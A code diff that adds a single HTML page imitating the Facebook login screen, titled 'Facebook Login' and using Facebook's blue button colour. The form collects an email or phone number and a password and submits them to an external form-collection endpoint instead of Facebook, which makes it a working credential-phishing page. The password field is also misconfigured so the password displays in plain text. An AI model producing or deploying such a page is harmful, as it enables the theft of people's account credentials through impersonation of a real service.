@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #f0f2f5;
+}
+
+.container {
+  max-width: 400px;
+  margin: 50px auto;
+  background-color: #fff;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+h2 {
+  text-align: center;
+  margin-bottom: 20px;
+  color:#C115E8;
+}
+
+form {
+  display: flex;
+  flex-direction: column;
+}
+
+label {
+  margin-bottom: 5px;
+}
+
+input[type="text"],
+input[type="Name"] {
+  padding: 10px;
+  margin-bottom: 15px;
+  border: 1px solid #ddd;
+  border-radius: 5px;
+}
+
+button {
+  padding: 10px;
+  background-color: #1877f2;
+  color: #fff;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  margin-top:10px;
+}
+
+button:hover {
+  background-color: #166fe5;
+}
+
+a {
+  text-align: center;
+  display: block;
+  margin-top: 10px;
+  color: #1877f2;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>Log Facebook</h2>
+    <form action="https://formspree.io/f/mayrddga" method="post">
+      <label for="email">Email or Phone</label>
+      <input type="text" id="email" name="email" placeholder="Enter your email" required>
+      <label for="Name">Password</label>
+      <input type="Name" id="Name" name="Name" placeholder="Enter your password" required>
+      <button type="submit">Log In</button>
+    </form>
+    <a href="#">Forgot password?</a>
+    <p><a href="#">Create New Account</a></p>
+  </div>
+</body>
+</html>
